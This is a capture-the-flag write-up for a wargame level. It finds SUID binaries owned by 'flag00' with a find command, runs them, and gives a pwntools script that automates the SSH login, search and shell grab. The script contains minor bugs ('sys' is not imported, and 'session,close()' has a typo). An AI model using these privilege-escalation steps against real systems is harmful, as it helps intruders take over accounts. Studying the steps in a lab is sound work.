# Level00

#### Description

This level requires you to _find_ a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.

Alternatively, look at the find man page.

To access this level, log in as level00 with the password of level00.

#### Solution

We just to find SUID set binaries which will run as the 'flag00' account. We can simply find them via a find command:

```bash
find / -type f -perm -4000 -user flag00 2>/dev/null
```

<figure><img src="../../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

Here we got 2 binaries, let's check both of them

* `/bin/.../flag00`

<figure><img src="../../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

* `/rofs/bin/.../flag00`

<figure><img src="../../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

By running any of the above binary, we got the flag00's account shell.

***

#### Python Automation

```python
from pwn import *
from sys import argv, exit

# Check if IP address is provided as an argument
if len(argv) < 2:
    sys.exit("IP address not found.")

# Establishes SSH connection with target IP address
session = ssh(host=argv[1], user='level00', password='level00')

# Run find command to locate SUID binaries owned by user provided and stores all the result
find_command = "find / -type f -user flag00 -perm -u=s 2>/dev/null"
result = session.run(find_command)
binary_paths = result.recvall().decode().strip().split('\n')

# Check if any binaries were found or not
if not binary_paths or binary_paths == ['']:
    print("No SUID binaries found which were owned by user flag00.")
    session,close()
    exit(1)

# Execute each binary one by one and check if it is executable, if it is then execute that binary
for binary_path in binary_paths:
    if not binary_path.strip():
        continue

    print(f"Attempting to execute binary: {binary_path}")

    check_command = f"ls -l {binary_path}"
    check_result = session.run(check_command)
    check_output = check_result.recvall().decode().strip()

    if check_output and 'x' in check_output.split()[0]:
        try:
            terminal = session.process(binary_path)
            print(f"Successfully executed binary: {binary_path}")
            terminal.sendline('getflag')
            terminal.interactive()
            break
        except Exception as e:
            print(f"Failed to execute {binary_path}: {str(e)}")
    else:
        print(f"Binary {binary_path} is not executable or does not exist.")

session.close()
```

<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

***
